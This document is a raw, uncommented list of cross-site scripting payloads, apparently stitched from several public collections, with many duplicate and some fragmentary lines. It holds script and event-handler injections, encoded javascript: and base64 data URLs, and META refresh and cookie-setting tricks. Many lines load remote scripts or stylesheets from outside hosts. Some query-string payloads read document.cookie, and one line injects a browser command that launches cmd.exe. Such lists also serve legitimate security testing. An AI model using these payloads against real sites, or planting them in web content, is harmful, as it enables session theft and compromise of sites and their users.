&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
'';!--\"&lt;XSS&gt;=&{()}
&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
&m=02&y=%3CSCRIPT%20SRC=http://xss.jgate.de/world.js%3E%3C/SCRIPT%3E
&m=%3Cscript%3E%20alert%20%28%27XSSPOSED%27%29;%20%3C/script%3E
<marquee/finish=confirm(2)>/
'>><marquee><h1>XSS</h1></marquee>
'">><marquee><h1>XSS</h1></marquee>
<marquee<marquee/onstart=confirm(2)>/onstart=confirm(1)
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<marquee/onstart=confirm(2)>/
<marquee/onstart=document.body.innerHTML=location.hash>//#<img src=x onerror=prompt(1)>>
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<marquee/onstart=this['innerHTML']=location.hash;>//#<img src=x onerror=alert(document.domain)>
<marquee/onstart=this['innerHTML']=unescape(location.hash);>//#<img src=x onerror=alert(document.domain)>
<marquee><script>alert('XSS')</script></marquee>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math><a xlink:href="//jsfiddle.net/t846h/">click
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<math><XSS href="javascript:alert(location)">aaa
&MAX_FILE_SIZE=10485760&url=%22%3E%3Cimg%20src=http://i.imgur.com/P8mL8.jpg%3E%3Csvg%3E%3Cscript%3E%3C!%3Ealert%28%22XSS%22%29%3C/script%3E&search=search&nsfwfilter=on
&md5=8780800e375e1ec86cb11a076dffcb61
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<meta content="&NewLine; 1 &NewLine;;JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<META HTTP-EQUIV="Link" Content="<http://vulnerability-lab.com/CrossSiteScripting.css>; REL=stylesheet">
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64###PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('CrossSiteScripting');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=jAvAsCriPt:aLeRt('CroSsSiteScrIpting');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('CrossSiteScripting');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('CrossSiteScripting');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
>"<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('CrossSiteScripting')</SCRIPT>">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
>"<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
<meta http-equiv="x-ua-compatible" content="ie=7"><iframe src=”//targetsite.com?xss=<div/style="width:expression(confirm(1))">X</div>”
<meta http-equiv="x-ua-compatible" content="ie=9"><iframe src=//targetsite?xss=<svg/onload%00=%00locatio%00n=nam%00e name=javascript:alert(document.domain)>
&method=%22;alert(%22XSS%22);//&q=XSS&q2=&q3=&q4=&c=en_US&results=10
&method=email&error=%22%3E%3Cscript%3Ealert%28String.fromCharCode%2888,%2083,%2083,%2080,%2079,%2083,%2069,%2068%29%29;%3C/script%3E
&mode=singleimage&handle=AdamGirard&number=%22%3E%3Cscript%3Ealert%28%22XSSPOSED%22%29%3C/script%3E
&mode=try&partner=Shopify&country=%22%3E%3Cimg%20src=x%20onerror=prompt%28/@The_Pr0ph3t/%29;%3E
&Module=SMMComplain&SMMOp=View&enter=SAMECRAP&SMM_CMD=SendLetter&SMMComplain_View_URL=1%3Cimg+src=http://talks.php.net/presentations/slides/php-under-attack/xss.png+onload=alert%28unescape%28/xss/.source%29%29%3E&SMMComplain_View_Message=WORKSOK@fbi.gov.edu
&Module=SMMNewsAgency&SMMOp=View&enter=EnterStuff&SMM_CMD=1%%27%22%3E%3CsCrIpT%20%3Ealert%28String.fromCharCode%2884,72,73,82,49,51,69,78,46,67,76,73,67,75,83%29%29;%3C/sCrIpT%3E&SMMContactUs_View_Parts=WHATISLOVE&SMMContactUs_View_Name=BABYDONTHURTME&SMMContactUs_View_EMail=DONTHURTME&SMMContactUs_View_URL=NOMORE&SMMContactUs_View_DEN%20DEN%20DEN%20DEN&SMMContactUs_View_Message=HEADBANGHEADBANG&SMMContactUs_View_Emergency=TILTTOTHELEFT
&month=12&year=1%22+onmouseover=alert%28String.fromCharCode%2873,108,32,68,65,84,79,32,73,78,32,67,79,83,84,82,85,90,73,79,78,69,44,32,70,70,83%29%29+
&month=dec&yr="><script>alert(document.cookie)</script>
&movieid=681&refid=&subkey="><script>alert('XSS')</script>
&m=search&o=%22%2f%3E%3Cscript%3Ealert%28%27xss%27%29%3b%3C/script%3E
&msg_id=%3CSCRIPT%3Ealert%28/XSSPOSED/%29%3C/SCRIPT%3E
&msg=/></script><script>alert('0');</script>&typ=sys
&N=0&Ntk=primary&Ntx=mode+matchallpartial&Ntt='</script><script>alert(0);//
&N=8110&Ntk=All&Ntt=%22%3Balert%28%27XSS%27%29%3B%2F%2F&Nty=1&D=%22%3Balert%28%27XSS%27%29%3B%2F%2F&Ntx=mode+matchallpartial&Dx=mode+matchallpartial&sid=12C953F338E0&srchLocalCode=us
&name111=%22\\%3E%3Cscript%3Ealert(0)%3C/script%3E
&name=%27;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//\\%27;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//%22;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//\\%22;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29%3C/SCRIPT%3E&size=XSS-by-GuidoZ
&nameCodeText="><img+src=x+onerror=prompt('XSSPOSED')>&searchType=searchForNameCode&nameCode="><img+src=x+onerror=prompt('XSSPOSED')>&text=&rnsSubmitButton=Search&activatedFilters=false&newsSource=ALL&mostRead=&headlineCode=ONLY_EARNINGS_NEWS&headlineId=&ftseIndex=&sectorCode=&rbDate=released&preDate=Today&newsPerPage=20
&name=Search&action=search&overview=1&bool=AND&active_polling%0D%0Aweblinks=1&active_address_book=1&active_consultation=1&active_forum=1&active_requirements=1&active_calendar=1&active_guestbook=1&active_questionnaire=1&active_seminar=1&active_stories=1&active_downloads=1&active_users=1&active_subjects=1&q=1%22+onmouseover=alert%28String.fromCharCode%2872,101,108,108,111,32,87,111,114,108,100,33%29%29+&search=&search_area=all
navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
&ncid="><script>alert('XSS')</script>
&newsCategory="'/><script>alert('XSS')</script>
&_nfpb=true&_pageLabel=Page_Search_searchResult&pageID=PSE_0001&topSearchQuery=awdawdawdttttt';alert('xss')//
&_nfpb=true&_pageLabel=search&Ntt=<script>alert(unescape(document.cookie));</script>
&nftype=empty&queryText=%22;+alert%28%22XSS%22%29;//&_requestid=305979
&nftype=empty&site_id=InformationWeek&queryText=%22%3Balert%28%27XSS%27%29%3B//&_requestid=116467
&nid=220&query=%22%3E%3Cscript%3Eeval%28String.fromCharCode%2897,108,101,114,116,40,39,88,83,83,39,41%29%29;%3C/script%3E&x=23&y=8
&node=--><svg><script><!>alert("XSS")</script>
</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
&Ntk=All&Ntx=mode+matchallpartial
&num=6'%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E
&o=%22%3E%3Cscript%3Evar%20asd='&id=';alert(document.cookie)%3C/script%3E&c=1&v=2&xc=A7E3B9E1#
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('CrossSiteScripting')></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>
>"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
<object classid="clsid:..." codebase="javascript:document.cookie=true;">
>"<object classid="clsid:..." codebase="javascript:document.cookie=true;">
<object data=//0me.me/demo/xss/xssproject.swf?js=alert(document.domain); allowscriptaccess=always></object> // Soroush Dallili
<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
<object data="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB 4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy 8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml"></object> // Firefox only
<object data="data:text/html;base64,%(base64)s">
<object data="data:text/html;base64,%(base64)s">
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="> // Firefox only
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object/data=”//goo.gl/nlX0P”>
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">​
<object data="javascript:alert(1)"> // FF <object/data="javascript&colon;alert(1)"> // FF <object data="&#x6A;avascript&colon;alert(1)">
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&# x72;&#x74;&#x28;&#x31;&#x29;">
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<object onerror=alert(1)>
<object onerror=javascript:javascript:alert(1)>
<object onerror=javascript:javascript:alert(1)>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<object type="application/x-shockwave-flash" data="http://www.vulnerability-lab.com/hack.swf" width="300" height="300"><param name="movie" value="http://www.subhohalder.com/xysecteam.swf" /><param name="quality" value="high" /><param name="scale" value="noscale" /><param name="salign" value="LT" /><param name="allowScriptAccess" value="always" /><param name="menu" value="false" /></object>
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<OBJECT TYPE="text/x-scriptlet" DATA="http://vulnerability-lab.com/scriptlet.html"></OBJECT>
<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
&offer="/><script>alert('JavaScript causes cancer')</script><br
om.Char.Code</button></body></html>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);
" onfocus=alert(document.domain) "> <"
" onhover="j&#x61;vascript:&#x61;lert(-1)"
' onmouseover=alert(/Black.Spook/)
